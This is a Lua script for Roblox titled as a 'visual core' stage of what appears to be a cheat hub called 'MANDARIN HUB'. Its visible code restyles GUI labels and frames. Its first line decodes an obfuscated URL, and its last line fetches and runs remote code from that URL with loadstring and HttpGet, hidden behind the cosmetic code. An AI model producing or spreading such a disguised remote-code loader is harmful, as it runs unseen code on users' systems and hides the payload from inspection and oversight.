
--[[ STAGE 2: VISUAL CORE ]]
local Tx0Dp6avg4ns8C1OQ="\114\027\007\094\104\097\019\120\123\115\116\057\060\055\202\222\214\213\206\223\215\255\199\249\246\247\133\248\159\131\147\171\132\149\172\178\074\187\075\064\066\185\066\104\086\110\074\123\095\101\127\117\010\026\114\003\126\010\117\009\017\021\118\202\202\055\216\031\209\214\208\251\228\225\252\138\255\193\139\159\159\135\168\149\162\171\189\179\183\141\064\071\064\144\107\106\086\122\121\127\120\012\116\007\030\000\040\016\033\043\046\122\200\039\205\015\004\020\210\212\237\226\235"local aiymY6DERjm8Ih0Vo25DKb=200 local l_F4VZeDzCV6er=77 local TK1fJIY6tubNf=1 local fZbKufGougF8T8hJwq=5 local UhOECzbiTSkGD=7 local jQStzCj5nxmbOtFWfZ=true local VjK9uZnvI0572ryP2GyE=bit32 and bit32.bxor if not VjK9uZnvI0572ryP2GyE then VjK9uZnvI0572ryP2GyE=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local hK0BaupPj7eLTzm={}for AGN_y2p0cHHWqLN=1,#Tx0Dp6avg4ns8C1OQ do local uBtsXKO4VAgh0K9JtPe=string.byte(Tx0Dp6avg4ns8C1OQ,AGN_y2p0cHHWqLN)local xz8nV77vo2rz=(l_F4VZeDzCV6er+(AGN_y2p0cHHWqLN*fZbKufGougF8T8hJwq)+UhOECzbiTSkGD)%256 if TK1fJIY6tubNf==0 then uBtsXKO4VAgh0K9JtPe=(uBtsXKO4VAgh0K9JtPe-xz8nV77vo2rz)%256 hK0BaupPj7eLTzm[AGN_y2p0cHHWqLN]=string.char(VjK9uZnvI0572ryP2GyE(uBtsXKO4VAgh0K9JtPe,aiymY6DERjm8Ih0Vo25DKb))else uBtsXKO4VAgh0K9JtPe=VjK9uZnvI0572ryP2GyE(uBtsXKO4VAgh0K9JtPe,aiymY6DERjm8Ih0Vo25DKb)hK0BaupPj7eLTzm[AGN_y2p0cHHWqLN]=string.char((uBtsXKO4VAgh0K9JtPe-xz8nV77vo2rz)%256)end end local OPpy09aP3tpxHDpcMNk=table.concat(hK0BaupPj7eLTzm)if jQStzCj5nxmbOtFWfZ then OPpy09aP3tpxHDpcMNk=string.reverse(OPpy09aP3tpxHDpcMNk)end local M2lEM1gGoxtcYX02=OPpy09aP3tpxHDpcMNk
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(M2lEM1gGoxtcYX02))()
